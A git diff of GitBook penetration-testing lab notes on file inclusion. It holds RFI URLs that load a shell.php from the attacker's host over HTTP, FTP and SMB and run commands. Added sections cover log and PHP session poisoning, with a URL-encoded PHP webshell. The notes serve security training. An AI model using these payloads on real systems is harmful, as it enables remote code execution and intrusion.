@@ -143,7 +143,7 @@ However, this may not always be reliable, as even if this setting is enabled, th
 http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, the `index.php` page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the `index.php` page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.
 
@@ -176,7 +176,7 @@ Now, we can include our local shell through RFI, like we did earlier, but using 
 http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command:
 
@@ -206,7 +206,7 @@ This may also be useful in case http ports are blocked by a firewall or the `htt
 http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### SMB
 
@@ -232,7 +232,7 @@ Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell
 http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
 
@@ -500,6 +500,8 @@ We should first attempt reading these logs through LFI, and if we do have access
 
 * Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd
 
+#### Server Log Poisoning
+
 First, fuff to the LFI to search directories -->
 
 ```
@@ -514,8 +516,37 @@ Now, intercept it with burpsuite -->
 
 <figure><img src="../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>
 
-With it we can see that the user agent is reflected, so...&#x20;
+With it we can see that the user agent is reflected, so... now input a php webshell in the User-Agent -->
 
-* Try to use a different technique to gain RCE and read the flag at /\
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
+Now, with it we can target to `&cmd=id` -->
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+#### PHP Sesion Poisoning
+
+After we found the LFI, we need to see what is the cookie:
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+In this case is a PHPSESSID we know this cookie save into --> `/var/lib/php/sessions/sess_2cabpj1b2p455j3iiccr8luurj`
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+We can see too, thsi reflected the until search, in this case, us cookie, so... if y paste in url/LFI a web shell, then they take my command -->
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+Now i set up a urlencode webshell -->&#x20;
+
+```url
+%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
